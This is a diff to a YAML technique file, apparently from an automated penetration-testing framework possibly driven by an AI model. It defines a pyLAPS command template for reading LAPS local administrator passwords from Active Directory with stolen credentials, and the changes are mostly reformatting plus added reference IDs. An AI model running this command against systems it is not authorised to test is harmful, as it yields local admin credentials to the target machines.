@@ -6,8 +6,7 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: python3 pyLAPS.py --action get -d {domain} -u '{username}' -p '{password}'
-  --dc-ip {target_ip}
+command_template: python3 pyLAPS.py --action get -d {domain} -u '{username}' -p '{password}' --dc-ip {target_ip}
 parser: generic_parser
 expected_effects:
 - laps_password_read
@@ -16,7 +15,15 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: LAPS stores randomized local admin password in ms-Mcs-AdmPwd (LAPSv1) or
-  ms-LAPS-Password (LAPSv2). Readable by authorized groups. Gives local admin on target
-  computer.
+mechanism: LAPS stores randomized local admin password in ms-Mcs-AdmPwd (LAPSv1) or ms-LAPS-Password (LAPSv2). Readable by
+  authorized groups. Gives local admin on target computer.
 hacktricks_ref: windows-hardening/active-directory-methodology/laps.md
+references:
+  ocd_mindmap_node_ids:
+  - 0d8efdd99f
+  - 366ba5514b
+  - 493e45bf91
+  - 9829e0c622
+  - 9ba0fe0706
+  - d7c8eb4071
+  - edcb56b401
